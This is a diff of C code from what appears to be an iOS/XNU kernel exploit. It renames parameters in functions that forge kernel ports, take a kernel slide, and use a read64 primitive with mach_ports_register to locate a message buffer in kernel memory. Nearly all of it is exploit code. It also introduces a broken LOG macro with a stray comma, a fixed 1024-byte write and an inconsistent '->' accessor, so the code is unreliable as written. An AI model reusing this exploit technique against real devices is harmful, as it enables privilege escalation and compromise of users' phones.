@@ -173,7 +173,8 @@ typedef struct
     char padding[4];
 } mach_msg_data_buffer_t;
 
-#define LOG(str, args...) do { } while(0)
+//#define LOG(str, args...) do { } while(0)
+#define LOG(str, args...) do {offsets->userland_funcs->write(1,str,1024,)} while(0)
 #define KERN_INVALID_ARGUMENT 2
 #define KERN_FAILURE 1
 #define KERN_SUCCESS 0
@@ -206,7 +207,7 @@ typedef struct
 
 uint64_t send_buffer_to_kernel_and_find(offsets_t *  offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size);
 
-void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets,void *(*write) (int fd,void * buf,uint64_t size)) {
+void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets) {
     mach_port_array_t maps = NULL;
     mach_msg_type_number_t maps_num = 0;
 	kern_return_t ret;
@@ -539,7 +540,7 @@ out:
 }
 
 // kinda messy function signature
-uint64_t send_buffer_to_kernel_and_find(offsets_t * offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
+uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
 {
     kern_return_t ret;
 
@@ -548,7 +549,7 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offs, uint64_t (^read64)(uin
     buffer_msg->head.msgh_size = msg_size;
 
     mach_port_t port;
-    ret = offs->userland_funcs.mach_port_allocate(offs->userland_funcs.mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+    ret = offsets->userland_funcs.mach_port_allocate(offsets->userland_funcs.mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to allocate mach port: %x", ret);
@@ -557,14 +558,14 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offs, uint64_t (^read64)(uin
 
     LOG("got port: %x", port);
 
-    ret = offs->userland_funcs.mach_port_insert_right(offs->userland_funcs.mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    ret = offsets->userland_funcs.mach_port_insert_right(offsets->userland_funcs.mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed ot insert send right: %x", ret);
         goto err;
     }
 
-    ret = offs->userland_funcs.mach_ports_register(offs->userland_funcs.mach_task_self(), &port, 1);
+    ret = offsets->userland_funcs.mach_ports_register(offsets->userland_funcs.mach_task_self(), &port, 1);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to register mach port: %x", ret);
@@ -573,14 +574,14 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offs, uint64_t (^read64)(uin
 
     buffer_msg->head.msgh_remote_port = port;
 
-    ret = offs->userland_funcs.mach_msg(&buffer_msg->head, MACH_SEND_MSG, buffer_msg->head.msgh_size, 0, 0, 0, 0);
+    ret = offsets->userland_funcs.mach_msg(&buffer_msg->head, MACH_SEND_MSG, buffer_msg->head.msgh_size, 0, 0, 0, 0);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to send mach message: %x (%s)", ret, mach_error_string(ret));
         goto err;
     }
 
-    uint64_t itk_registered = read64(our_task_addr + offs->struct_offsets.itk_registered);
+    uint64_t itk_registered = read64(our_task_addr + offsets->struct_offsets.itk_registered);
     if (itk_registered == 0x0)
     {
         LOG("failed to read our_task_addr->itk_registered!");
@@ -626,7 +627,7 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offs, uint64_t (^read64)(uin
         goto err;
     }
 
-    ret = offs->userland_funcs.mach_ports_register(offs->userland_funcs.mach_task_self(), NULL, 0);
+    ret = offsets->userland_funcs.mach_ports_register(offsets->userland_funcs.mach_task_self(), NULL, 0);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to call mach_ports_register: %x", ret);
